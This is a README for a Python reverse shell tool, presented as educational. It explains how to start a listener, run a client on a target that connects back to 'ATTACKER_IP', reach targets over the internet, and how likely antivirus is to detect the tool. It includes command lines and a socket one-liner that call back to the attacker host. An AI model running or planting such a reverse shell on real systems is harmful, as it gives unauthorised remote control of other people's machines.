# Reverse Shell Tool

A Python-based reverse shell implementation that allows remote command execution over a network connection.

## **DISCLAIMER & LEGAL WARNING**

**THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY.**

- **Legal Use Only**: Only use this tool on systems you own or have explicit written permission to test
- **Unauthorized Access is Illegal**: Using this tool to access systems without permission violates computer fraud laws
- **Educational Purpose**: This project is for learning about network security, Python sockets, and ethical hacking principles

By using this tool, you agree that you are solely responsible for how it is used.

## **Project Structure**

```
reverse-shell/
├── server.py          # Attacker/listener (run on your machine)
├── client.py          # Target/connector (run on remote machine)
└── README.md          # This documentation
```

##  **Setup & Installation**

### **Requirements**
- Python 3.6 or higher
- Network connectivity between machines
- Appropriate firewall permissions

### **Quick Start**

1. **Clone or download the files**
2. **On the attacker machine (where you want to receive the shell):**
   ```bash
   python server.py
   ```

3. **On the target machine:**
   ```bash
   python client.py [ATTACKER_IP]
   ```

## **Usage Guide**

### **Step 1: Find Your Attacker IP Address**

Before starting, you need to know the IP address of the attacker machine:

#### **On Windows (Attacker Machine):**
```cmd
ipconfig
```
Look for the IPv4 address under your active network adapter (usually Wi-Fi or Ethernet). It will look like `192.168.x.x` or `10.x.x.x`.

**Example output:**
```
Wireless LAN adapter Wi-Fi:
   IPv4 Address. . . . . . . . . . . : 192.168.1.100  ← USE THIS IP
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
```

#### **On Linux/Mac (Attacker Machine):**
```bash
ifconfig
# or
ip addr show
```

### **Step 2: Start the Listener (Attacker Machine)**

```bash
# Method 1: Use default settings (will show available IPs)
python server.py

# Method 2: Specify your IP manually
python server.py YOUR_IP_ADDRESS

# Method 3: Specify IP and custom port
python server.py YOUR_IP_ADDRESS 4444
```

**Example:**
```bash
python server.py 192.168.1.100 9001
```

### **Step 3: Run the Client (Target Machine)**

```bash
# Connect to the attacker's IP
python client.py ATTACKER_IP_ADDRESS

# With custom port
python client.py ATTACKER_IP_ADDRESS 4444
```

**Example:**
```bash
python client.py 192.168.1.100 9001
```

## **Command Reference**

### **Basic Commands**
Once connected, you can execute commands on the target machine:

```
shell> whoami          # Check current user
shell> ipconfig        # Network info (Windows)
shell> ifconfig        # Network info (Linux/Mac)
shell> dir             # List directory (Windows)
shell> ls              # List directory (Linux/Mac)
shell> cd [directory]  # Change directory
shell> pwd             # Print working directory
shell> exit            # Close connection
```

### **Network Scenarios**

| Scenario | How to Connect |
|----------|----------------|
| **Same WiFi Network** | Use the WiFi IP from `ipconfig` |
| **Same Ethernet Network** | Use the Ethernet IP from `ipconfig` |
| **WSL to Windows** | Use the WSL IP (usually 172.x.x.x) |
| **Local Testing** | Use `127.0.0.1` or `localhost` |
| **Over Internet** | Requires port forwarding and public IP |

## **Troubleshooting**

1. **"Connection refused"**
   - Make sure server is running: `python server.py YOUR_IP`
   - Check if IP address is correct
   - Verify firewall isn't blocking port 9001

2. **"Can't type after first command"**
   - This version has fixed the issue
   - If problems persist, press Enter once to refresh prompt

3. **"No output received"**
   - Try simple commands first: `echo test`, `whoami`
   - Check target machine's network connectivity
   - Verify Python is installed on target

4. **Testing Connectivity**
   ```bash
   # From target machine, test if port is open:
   telnet ATTACKER_IP 9001
   # or
   python -c "import socket; s=socket.socket(); s.connect(('ATTACKER_IP',9001)); print('Connected')"
   ```

### **Local Testing First**
Test everything works locally before trying over network:

**Terminal 1 (Server):**
```bash
python server.py 127.0.0.1
```

**Terminal 2 (Client):**
```bash
python client.py 127.0.0.1
```

### **Features**
- **Auto-reconnect**: Client reconnects automatically if connection drops
- **Platform detection**: Uses correct shell for Windows/Linux
- **Timeout handling**: Commands timeout after 30 seconds
- **Error recovery**: Graceful handling of connection issues

##  **License**

This project is for educational purposes only. Users are solely responsible for complying with all applicable laws.

## **FAQ**

**Q: How do I find my IP address?**
A: Run `ipconfig` on Windows or `ifconfig` on Linux/Mac. Look for IPv4 address.

**Q: Can this work over the internet?**
A: Yes, but you need port forwarding on your router and to use your public IP.

**Q: Is this detectable by antivirus?**
A: Python scripts may be flagged. Compiled executables have higher detection rates.

**Q: How do I stop the connection?**
A: Type `exit` on server, or Ctrl+C on both ends.

**Q: Why use port 9001?**
A: It's a common non-standard port. You can use any available port (4444, 8080, etc.).

---

**Remember**: Use this tool responsibly and only on systems you own or have permission to test.

*Last Updated: 2024*
